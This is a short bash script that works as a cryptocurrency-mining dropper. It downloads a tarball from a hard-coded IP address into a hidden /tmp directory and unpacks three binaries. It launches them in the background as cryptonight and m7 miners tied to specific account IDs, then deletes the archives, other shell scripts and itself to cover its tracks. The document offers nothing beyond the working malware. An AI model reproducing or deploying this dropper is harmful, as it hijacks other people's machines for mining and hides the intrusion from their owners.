#!/bin/bash
rm -f /tmp/httpdlog/*.gz
rm -f *.gz

rm -f *.sh
rm -f $0

ret=`ps -ef|grep  qwe15884889.01 |grep -v grep`
if [ -n "$ret" ]
then
rm -f /tmp/httpdlog/*.gz
rm -f *.gz
rm -f *.sh
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
rm -f $0
echo "yes"
else
mkdir /tmp/.httpdlog
cd /tmp/.httpdlog
typeos=`getconf LONG_BIT`
if [ "$typeos" = "64" ]
then
wget http://119.249.54.100:8846/mall.tar.gz -O my.tar.gz
fi
tar zxvf my.tar.gz
chmod 777 ./mstbcn
chmod 777 ./mstrie
chmod 777 ./mstxcn
rm -f /tmp/httpdlog/*.gz
rm -f *.gz
nohup ./mstbcn  -a cryptonight -o bcn -u qwe15884889.01 -p x -B >/dev/null 2>&1 &
nohup ./mstrie -m -o ric -u qwe15884889.02 -p x >/dev/null 2>&1 &
nohup ./mstxcn -a m7 -o bcn -u qwe15884889.01 -p x >/dev/null 2>&1 &
echo "ok"
rm -f $0
fi

